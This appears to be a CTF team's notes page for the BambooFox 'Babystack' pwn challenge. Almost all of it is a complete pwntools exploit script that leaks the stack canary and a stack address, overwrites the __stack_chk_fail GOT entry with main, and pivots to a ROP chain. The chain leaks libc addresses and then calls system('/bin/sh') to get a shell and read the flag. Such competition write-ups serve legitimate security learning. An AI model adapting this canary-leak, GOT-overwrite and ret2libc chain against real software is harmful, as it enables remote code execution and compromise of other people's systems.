## Babystack
> **Category:** Pwn
> **Description:** nc chall.ctf.bamboofox.tw 10102
>
> Just a simple pwn challenge.
>
> **Pad Link:** http://34.87.94.220/pad/pwn-babystack
> **Flag:**
---

## References


## Bugs


## Exploit Ideas

We can overwrite rbp with the following script. Execution continues at the final `read` call in `main`.

```python
import sys
from pwn import *

STACK_CHK_FAIL_GOT = 0x403420
PUTS_GOT = 0x403410
READ_GOT = 0x403428

PUTS_PLT = 0x401030
STRLEN_PLT = 0x401046
READ_PLT = 0x401060
MEMCMP_PLT = 0x401076
MAIN = 0x401379
PIVOT = 0x403800
POP_RBX_RBP_RET = 0x004014b7
POP_RBP_RET = 0x00401169

POP_RDI_RET = 0x004014bb
POP_RSI_R15_RET = 0x004014b9
SYSCALL = 0x401437

# p = process("./babystack")
p = remote("chall.ctf.bamboofox.tw", 10102)
# pause()

###########
# STAGE 1 #
###########
print("[*] STAGE 1 ATTACK. LEAK CANARY & OVERWRITE _STACK_CHK_FAIL WITH MAIN")

p.sendline("daniao")
print(p.recvuntil("token"))
p.send("a"*16)

# leak canary and rbp
print(p.recvuntil("str1:"))
p.send("a\x00")
print(p.recvuntil("str2:"))
p.send("c"*7)

p.recvuntil("c"*7)
CANARY = "\x00" + p.recv(7)
print("[+] CANARY: {:x}".format(u64(CANARY)))
STACK = u64(p.recv(6) + "\x00\x00") - 0x40 + 0xb0
print("[+] STACK: 0x{:x}".format(STACK))

# smash the stack
print(p.recvuntil("str1:"))
p.send("\x00" + "a"*15)
print(p.recvuntil("str2:"))

# overwrite __stack_chk_fail with main
RBP = p64(STACK_CHK_FAIL_GOT+0x48)
payload = "c" * 40 + CANARY + RBP
p.send(payload)
sleep(0.1)
p.send(p64(STRLEN_PLT) + p64(MAIN))
sleep(0.1)

###########
# STAGE 2 #
###########
print("[*] STAGE 2 ATTACK. WRITING ROPCHAIN TO 0x403800")

def write_to_addr(addr, s):
    p.send("a")
    sleep(0.1)
    p.send("deadbeef")
    sleep(0.1)

    p.send("a")
    sleep(0.1)
    p.send("a")
    sleep(0.1)

    # write to PIVOT location
    p.send("\x00" + "a"*15)
    sleep(0.1)
    RBP = p64(addr+0x50)
    payload = "c" * 40 + CANARY + RBP
    p.send(payload)
    p.send(s)
    sleep(0.1)


# call read(0, PIPVOT-0x100, ...) to set rax to 0x20
ROPCHAIN = p64(POP_RDI_RET)
ROPCHAIN += p64(0)
ROPCHAIN += p64(POP_RSI_R15_RET)
ROPCHAIN += p64(PIVOT-0x100)
ROPCHAIN += p64(0)
ROPCHAIN += p64(READ_PLT)

# setup rbp for after syscall
ROPCHAIN += p64(POP_RBP_RET)
ROPCHAIN += p64(PIVOT + len(ROPCHAIN) + 8 * 5)

# syscall dup(0), rax=0x20, rdi=0
ROPCHAIN += p64(POP_RDI_RET)
ROPCHAIN += p64(0)
ROPCHAIN += p64(SYSCALL)

ROPCHAIN += CANARY
ROPCHAIN += "A"*8

# puts("Name:") to clear output stream
ROPCHAIN += p64(POP_RDI_RET)
ROPCHAIN += p64(0x402047)
ROPCHAIN += p64(PUTS_PLT)

# puts(PUTS.GOT)
ROPCHAIN += p64(POP_RDI_RET)
ROPCHAIN += p64(PUTS_GOT)
ROPCHAIN += p64(PUTS_PLT)

# puts(READ.GOT)
ROPCHAIN += p64(POP_RDI_RET)
ROPCHAIN += p64(READ_GOT)
ROPCHAIN += p64(PUTS_PLT)

# write to continue
ROPCHAIN += p64(POP_RDI_RET)
ROPCHAIN += p64(0)
ROPCHAIN += p64(POP_RSI_R15_RET)
ROPCHAIN += p64(PIVOT + len(ROPCHAIN) + 8 * 3)
ROPCHAIN += p64(0)
ROPCHAIN += p64(READ_PLT)

for i in range(0, len(ROPCHAIN), 8):
    sys.stdout.write(".")
    write_to_addr(PIVOT+i, ROPCHAIN[i:i+8])

sys.stdout.write("\n")

###########
# STAGE 3 #
###########
print("[*] STAGE 3 ATTACK. PUT CANARY ON TOP OF PIVOT & SET RBP TO TOP OF PIVOT")

write_to_addr(PIVOT-0x10, CANARY)
write_to_addr(PIVOT-0x58, "\x00")

# to set rax=0x20
p.send("A"*0x20)

# clear outputs
p.recvuntil("Name:")
p.recvline()

PUTS_LIBC = u64(p.recv(6) + "\x00\x00")
print("[+] PUTS@LIBC: 0x{:x}".format(PUTS_LIBC))
p.recvline()

READ_LIBC = u64(p.recv(6) + "\x00\x00")
print("[+] READ@LIBC: 0x{:x}".format(READ_LIBC))

LIBC_BASE = PUTS_LIBC - 0x083cc0
print("[+] LIBC_BASE: 0x{:x}".format(LIBC_BASE))

###########
# STAGE 4 #
###########
print("[*] STAGE 4 ATTACK. ROP SYSTEM")

SYSTEM_LIBC = LIBC_BASE + 0x052fd0
print("[+] SYSTEM@LIBC: 0x{:x}".format(SYSTEM_LIBC))
BINSH_LIBC = LIBC_BASE + 0x1afb84
print("[+] BINSH@LIBC: 0x{:x}".format(BINSH_LIBC))

ROPCHAIN = ""
ROPCHAIN += p64(POP_RDI_RET)
ROPCHAIN += p64(BINSH_LIBC)
ROPCHAIN += p64(SYSTEM_LIBC)

p.send(ROPCHAIN)
sleep(0.1)

p.sendline("cat /home/babystack/flag")

p.interactive()
```
